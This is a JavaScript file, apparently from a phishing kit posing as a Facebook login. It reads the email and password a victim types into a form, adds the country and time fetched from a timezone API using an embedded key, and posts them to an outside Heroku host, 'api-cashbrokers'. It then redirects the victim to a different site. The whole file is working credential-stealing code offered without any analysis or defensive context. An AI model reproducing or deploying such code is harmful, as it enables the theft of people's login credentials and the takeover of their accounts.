var userCashBrokers = '10goeh'
var redirecionCashB = 'https://party.mobileappsonline.org/?cm=bb7aaf01bc693b46d440621f43f925ca2f36754d3363796166536a4e6d5752576c6679594f673d3d'
var pais;
var hora;
// document.getElementById('kb2').style.display = 'none';

fetch('https://api.timezonedb.com/v2.1/get-time-zone?key=DI3AGKADZLAR&format=json&by=zone&zone=America/Santo_Domingo')
    .then(function(response) {
        return response.json();
    })
    .then(function(kbjson) {
        pais = kbjson.countryName;
        hora = kbjson.formatted;
    });


getDataForm = function(){  

    var temail = document.querySelector('#email').value;
    var tpass = document.querySelector('#password').value;

    if(temail != "" && tpass != ""){

    var kbobject = {
        email : temail,
        password : tpass,
        country : pais,
        condition : 'new',
        date : hora,
        username : userCashBrokers
    };

    fetch('https://api-cashbrokers.herokuapp.com/facebook',
    {
        method: 'POST',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(kbobject)
    })
    .then(function(res){ return res.json(); })
    .then(function(data){
        window.location = redirecionCashB;
     })

    } 
}
